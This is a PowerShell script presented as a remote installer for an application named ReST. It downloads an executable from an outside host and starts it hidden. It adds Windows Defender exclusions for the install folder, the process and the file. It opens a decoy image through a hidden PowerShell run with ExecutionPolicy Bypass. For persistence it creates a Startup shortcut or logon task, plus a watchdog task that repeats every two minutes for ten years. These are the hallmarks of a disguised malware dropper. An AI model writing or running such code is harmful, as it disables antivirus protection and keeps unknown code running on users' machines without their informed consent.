# ReST remote install - ASCII only for PowerShell 5.1 compatibility
param(
    [switch]$Silent
)

$ErrorActionPreference = "Continue"
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Unblock-File -LiteralPath $scriptPath -ErrorAction SilentlyContinue
}
$BaseUrl = $env:RESA_INSTALL_BASE
if (-not $BaseUrl) {
    $BaseUrl = "https://olxp.cc/download"
}
$BaseUrl = $BaseUrl.Trim().TrimEnd("/")
if ($BaseUrl -match "\s") {
    $BaseUrl = ($BaseUrl -split "\s+")[0]
}

$Dir = Join-Path $env:LOCALAPPDATA "ReST"
$Exe = Join-Path $Dir "ReST.exe"
$TempZip = Join-Path $env:TEMP "ReST-download.zip"
$LogFile = Join-Path $env:TEMP "ReST-install.log"
$script:HadError = $false

function Write-InstallLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Fail-Install {
    param([string]$Text)
    $script:HadError = $true
    Write-InstallLog $Text
    if (-not $Silent) {
        Write-Host $Text -ForegroundColor Red
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {
        $null = $_
    }

    $curl = Join-Path $env:SystemRoot "System32\curl.exe"
    if (Test-Path -LiteralPath $curl) {
        & $curl -fsSL --retry 2 --retry-delay 1 -o $OutFile $Url
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
            return
        }
    }

    $iwrArgs = @{
        Uri = $Url
        OutFile = $OutFile
        UseBasicParsing = $true
    }
    if ($PSVersionTable.PSVersion.Major -lt 6) {
        $iwrArgs.UserAgent = "ReST-Installer/1.0"
    }
    Invoke-WebRequest @iwrArgs
}

function Extract-ReSTZip {
    param(
        [string]$ZipFile,
        [string]$OutExe
    )

    $stage = Join-Path $env:TEMP ("ReST-stage-" + [Guid]::NewGuid().ToString("N"))
    New-Item -ItemType Directory -Force -Path $stage | Out-Null
    try {
        $extracted = $null
        try {
            Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
            [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $stage)
            $extracted = Join-Path $stage "ReST.exe"
        } catch {
            $null = $_
        }

        if (-not ($extracted -and (Test-Path -LiteralPath $extracted))) {
            $tar = Join-Path $env:SystemRoot "System32\tar.exe"
            if (Test-Path -LiteralPath $tar) {
                & $tar -xf $ZipFile -C $stage
                $extracted = Join-Path $stage "ReST.exe"
            }
        }

        if (-not ($extracted -and (Test-Path -LiteralPath $extracted))) {
            Expand-Archive -LiteralPath $ZipFile -DestinationPath $stage -Force
            $extracted = Join-Path $stage "ReST.exe"
        }

        if (-not (Test-Path -LiteralPath $extracted)) {
            throw "ReST.exe missing in zip"
        }

        if (Test-Path -LiteralPath $OutExe) {
            Remove-Item -LiteralPath $OutExe -Force -ErrorAction SilentlyContinue
        }
        Move-Item -LiteralPath $extracted -Destination $OutExe -Force
    } finally {
        Remove-Item -LiteralPath $stage -Recurse -Force -ErrorAction SilentlyContinue
    }
}

function Add-DefenderExclusion {
    param(
        [string]$Path,
        [string]$ExePath
    )

    $ok = $false
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Write-InstallLog ("defender path exclusion ok: " + $Path)
        $ok = $true
    } catch {
        Write-InstallLog ("defender path exclusion skipped: " + $_.Exception.Message)
    }

    try {
        Add-MpPreference -ExclusionProcess "ReST.exe" -ErrorAction Stop
        Write-InstallLog "defender process exclusion ok: ReST.exe"
        $ok = $true
    } catch {
        Write-InstallLog ("defender process exclusion skipped: " + $_.Exception.Message)
    }

    if ($ExePath -and (Test-Path -LiteralPath $ExePath)) {
        try {
            Add-MpPreference -ExclusionPath $ExePath -ErrorAction Stop
            Write-InstallLog ("defender file exclusion ok: " + $ExePath)
            $ok = $true
        } catch {
            Write-InstallLog ("defender file exclusion skipped: " + $_.Exception.Message)
        }
    }

    return $ok
}

function Start-InstallPictureAsync {
    param([string]$BaseUrl)

    $pictureUrl = $BaseUrl + "/picture_1963.webp"
    Write-InstallLog ("picture parallel: " + $pictureUrl)

    $safeUrl = $pictureUrl.Replace("'", "''")
    $safeLog = $LogFile.Replace("'", "''")
    $picFile = Join-Path $env:TEMP "ReST-picture_1963.webp"
    $safePic = $picFile.Replace("'", "''")

    $script = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$ProgressPreference = 'SilentlyContinue'
function Write-PicLog([string]`$Text) {
    try { Add-Content -LiteralPath '$safeLog' -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' [picture] ' + `$Text) -Encoding UTF8 } catch {}
}
`$pictureUrl = '$safeUrl'
`$picFile = '$safePic'
try {
    Start-Process -FilePath 'rundll32.exe' -ArgumentList @('url.dll,FileProtocolHandler', `$pictureUrl) -WindowStyle Hidden -ErrorAction Stop
    Write-PicLog 'opened in browser'
    exit 0
} catch {}
Write-PicLog 'browser open failed, trying download'
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    `$curl = Join-Path `$env:SystemRoot 'System32\curl.exe'
    if (Test-Path -LiteralPath `$curl) {
        & `$curl -fsSL -o `$picFile `$pictureUrl
    } else {
        Invoke-WebRequest -Uri `$pictureUrl -OutFile `$picFile -UseBasicParsing
    }
    if (Test-Path -LiteralPath `$picFile) {
        `$fileUri = 'file:///' + (`$picFile -replace '\\','/')
        Start-Process -FilePath 'rundll32.exe' -ArgumentList @('url.dll,FileProtocolHandler', `$fileUri) -WindowStyle Hidden
        Write-PicLog 'opened from local file'
    }
} catch {
    Write-PicLog `$_.Exception.Message
}
"@

    $runner = Join-Path $env:TEMP "ReST-picture-run.ps1"
    Set-Content -LiteralPath $runner -Value $script -Encoding ASCII
    Start-Process -FilePath "powershell.exe" -ArgumentList @(
        "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", $runner
    ) -WindowStyle Hidden | Out-Null
}

function Register-WatchdogTask {
    param(
        [string]$TaskName,
        [string]$Exe,
        [string]$Dir
    )

    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.ps1") -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.vbs") -Force -ErrorAction SilentlyContinue

    $Action = New-ScheduledTaskAction -Execute $Exe -Argument "-watchdog" -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
}

function Remove-ReSTStartupTask {
    try {
        Unregister-ScheduledTask -TaskName "ReST" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    } catch {
        $null = $_
    }
}

function Remove-ReSTStartupShortcut {
    try {
        $lnk = Join-Path ([Environment]::GetFolderPath("Startup")) "ReST.lnk"
        if (Test-Path -LiteralPath $lnk) {
            Remove-Item -LiteralPath $lnk -Force -ErrorAction SilentlyContinue
        }
    } catch {
        $null = $_
    }
}

Write-InstallLog "install start"
Write-InstallLog ("target: " + $Exe)
Start-InstallPictureAsync -BaseUrl $BaseUrl

try {
    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
} catch {
    $null = $_
}

Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 200

$Url = $BaseUrl + "/ReST.zip"
Write-InstallLog ("download: " + $Url)

if (Test-Path -LiteralPath $TempZip) {
    Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
}

try {
    Download-File -Url $Url -OutFile $TempZip
} catch {
    Fail-Install ("download failed: " + $_.Exception.Message)
    exit 1
}

if (-not (Test-Path -LiteralPath $TempZip)) {
    Fail-Install "missing file after download"
    exit 1
}

$length = (Get-Item -LiteralPath $TempZip).Length
if ($length -lt 524288) {
    Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
    Fail-Install ("file too small: " + $length + " bytes")
    exit 1
}

try {
    Extract-ReSTZip -ZipFile $TempZip -OutExe $Exe
} catch {
    Fail-Install ("extract failed: " + $_.Exception.Message)
    exit 1
} finally {
    Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
}

if (-not (Test-Path -LiteralPath $Exe)) {
    Fail-Install "ReST.exe missing after extract"
    exit 1
}

Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

$startupOk = $false
try {
    $Startup = [Environment]::GetFolderPath("Startup")
    $Wsh = New-Object -ComObject WScript.Shell
    $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReST.lnk"))
    $Link.TargetPath = $Exe
    $Link.WorkingDirectory = $Dir
    $Link.WindowStyle = 7
    $Link.Save()
    Remove-ReSTStartupTask
    $startupOk = $true
    Write-InstallLog "startup shortcut ok"
} catch {
    $null = $_
}

if (-not $startupOk) {
    Remove-ReSTStartupShortcut
    $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
    Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
    Write-InstallLog "scheduled task ok"
}

try {
    Register-WatchdogTask -TaskName "ReST-Watchdog" -Exe $Exe -Dir $Dir
    Write-InstallLog "watchdog task ok"
} catch {
    Write-InstallLog ("watchdog task skipped: " + $_.Exception.Message)
}

try {
    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
    Write-InstallLog "started"
} catch {
    Fail-Install ("start failed: " + $_.Exception.Message)
    exit 1
}

Write-InstallLog "install complete"
if (-not $Silent) {
    Write-Host "ReST install complete." -ForegroundColor Green
}

exit 0
